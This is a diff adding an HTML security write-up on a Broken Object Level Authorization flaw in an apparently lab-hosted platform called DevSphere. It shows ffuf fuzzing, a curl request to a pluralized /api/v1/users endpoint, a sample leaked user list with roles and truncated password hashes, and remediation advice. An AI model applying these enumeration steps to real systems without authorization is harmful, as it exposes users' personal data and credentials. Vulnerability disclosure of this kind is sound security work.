@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- SEO & META DATA -->
+    <title>Analysis: Massive PII & Administrative Data Leak via API BOLA | Research Lab</title>
+    <meta name="description" content="Technical analysis of a Broken Object Level Authorization (BOLA) vulnerability discovered via manual API pluralization by Primandito Adi Setiya.">
+    <meta name="robots" content="index, follow">
+
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --accent: #ff5555;
+            --border: #222;
+            --text-main: #f0f0f0;
+            --text-dim: #888;
+            --code-green: #00ff41;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text-main); line-height: 1.7; padding: 40px 20px; }
+        .container { max-width: 850px; margin: 0 auto; }
+
+        .back-nav { margin-bottom: 40px; }
+        .back-link { font-family: 'IBM Plex Mono', monospace; color: var(--accent); text-decoration: none; font-size: 0.8rem; border: 1px solid var(--accent); padding: 8px 15px; transition: 0.3s; }
+        .back-link:hover { background: var(--accent); color: #fff; }
+
+        header { margin-bottom: 50px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
+        h1 { font-family: 'IBM Plex Mono', monospace; font-size: clamp(1.4rem, 4vw, 1.8rem); margin-bottom: 10px; color: #fff; }
+        .meta-info { font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: var(--text-dim); display: flex; gap: 20px; flex-wrap: wrap; }
+        .meta-info span b { color: var(--accent); }
+
+        .summary-box { background: #111; border: 1px solid var(--border); padding: 25px; margin-bottom: 40px; }
+        .summary-box h2 { font-family: 'IBM Plex Mono', monospace; font-size: 1rem; color: #fff; margin-bottom: 10px; border-left: 3px solid var(--accent); padding-left: 15px; }
+        .summary-box p { font-size: 0.95rem; color: #ccc; }
+
+        .video-section { margin-bottom: 60px; }
+        .video-container { width: 100%; aspect-ratio: 16/9; background: #000; border: 1px solid var(--border); position: relative; margin-top: 15px; }
+        .video-container iframe { position: absolute; top:0; left:0; width:100%; height:100%; border:none; }
+
+        section { margin-bottom: 50px; }
+        h2 { font-family: 'IBM Plex Mono', monospace; font-size: 1.1rem; color: #fff; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        h2::before { content: "> "; color: var(--accent); }
+
+        pre { background: #000; border: 1px solid var(--border); padding: 20px; overflow-x: auto; margin: 20px 0; position: relative; }
+        code { font-family: 'IBM Plex Mono', monospace; font-size: 0.9rem; color: var(--code-green); }
+        .code-label { position: absolute; top: 0; right: 0; background: var(--border); color: #666; font-size: 0.6rem; padding: 3px 10px; font-family: 'IBM Plex Mono', monospace; }
+
+        .highlight { color: var(--accent); font-weight: 500; }
+        footer { margin-top: 100px; padding-top: 30px; border-top: 1px solid var(--border); text-align: center; font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: #444; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <nav class="back-nav">
+            <a href="../index.html" class="back-link">[ BACK_TO_LAB_INDEX ]</a>
+        </nav>
+
+        <header>
+            <h1>Massive PII & Administrative Data Leak via API BOLA</h1>
+            <div class="meta-info">
+                <span>DATE: <b>2026-09-04</b></span>
+                <span>SEVERITY: <b>CRITICAL</b></span>
+                <span>CATEGORY: <b>BOLA / DATA_EXPOSURE</b></span>
+            </div>
+        </header>
+
+        <div class="summary-box">
+            <h2>EXECUTIVE SUMMARY</h2>
+            <p>
+                This analysis documents a <strong>Broken Object Level Authorization (BOLA)</strong> vulnerability on the DevSphere platform. By manually manipulating API endpoints from singular resources to plural collections, an unprivileged user can exfiltrate the <strong>entire user database</strong>, including private emails, internal roles, and <strong>PBKDF2 password hashes</strong> for all accounts, including System Administrators.
+            </p>
+        </div>
+
+        <section class="video-section">
+            <h2>EXPLOITATION_POC (VIDEO)</h2>
+            <div class="video-container">
+                <iframe width="560" height="315" src="https://www.youtube.com/embed/rjrthX_l3nw?si=yPtbLh0vzX1d0PcX" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </div>
+        </section>
+
+        <section>
+            <h2>TECHNICAL_WALKTHROUGH</h2>
+            <p>The exploitation sequence moves from standard enumeration to manual logic testing of the API structure.</p>
+            
+            <h3>1. Discovery via Fuzzing</h3>
+            <p>Using <code>ffuf</code>, I identified the standard endpoint used by the application to manage individual profile data: <code>/api/v1/user</code>.</p>
+
+            <pre><span class="code-label">DIRECTORY_FUZZING_CLI</span><code>
+ffuf -u http://127.0.0.1:5000/FUZZ -w ./api_wordlist.txt -b "session=[USER_COOKIE]"
+
+[+] /api/v1/user  [Status: 200, Size: 121]</code></pre>
+
+            <h3>2. Manual API Pluralization Test</h3>
+            <p>Based on the discovery of the singular resource, I conducted a manual test using the pluralized version of the endpoint (<code>/users</code>). The backend failed to implement any authorization checks on this collection-based resource.</p>
+
+            <pre><span class="code-label">MANUAL_ENDPOINT_MANIPULATION</span><code>
+# Requesting the pluralized collection endpoint
+curl -s http://127.0.0.1:5000/api/v1/users -b "session=eyJ1c2Vy..." | jq .</code></pre>
+
+            <h3>3. Mass Data Exfiltration</h3>
+            <p>The server responded with a massive JSON array containing the full database records of every user registered on the platform. The data was not filtered, exposing password hashes and administrative roles.</p>
+
+            <pre><span class="code-label">VULNERABLE_MASS_RESPONSE</span><code>
+[
+  {
+    "id": 1,
+    "username": "superadmin",
+    "email": "admin@devsphere.local",
+    "password": "PBKDF2$sha256$500000$...",
+    "role": "SYSTEM_ADMIN"
+  },
+  {
+    "id": 102,
+    "username": "test_account",
+    "email": "test@example.com",
+    "password": "...",
+    "role": "USER"
+  },
+  ... [Full Database Output]
+]</code></pre>
+
+            <p><b>Impact Analysis:</b> This vulnerability represents a complete failure of the platform's authorization model. Access to administrator password hashes allows for infrastructure-wide compromise, while the leak of thousands of user emails constitutes a major privacy violation.</p>
+        </section>
+
+        <section>
+            <h2>REMEDIATION_STRATEGY</h2>
+            <p>
+                To mitigate this, the application must enforce strict <span class="highlight">Object-Level Authorization</span>. Access to collection endpoints like <code>/api/v1/users</code> must be restricted solely to users with <code>SYSTEM_ADMIN</code> privileges. Furthermore, sensitive security fields such as password hashes should never be returned in any public-facing API response.
+            </p>
+        </section>
+
+        <footer>
+            © 2026 PRIMANDITO ADI SETIYA // SECURITY_RESEARCH_WRITEUP
+        </footer>
+    </div>
+
+</body>
+</html>
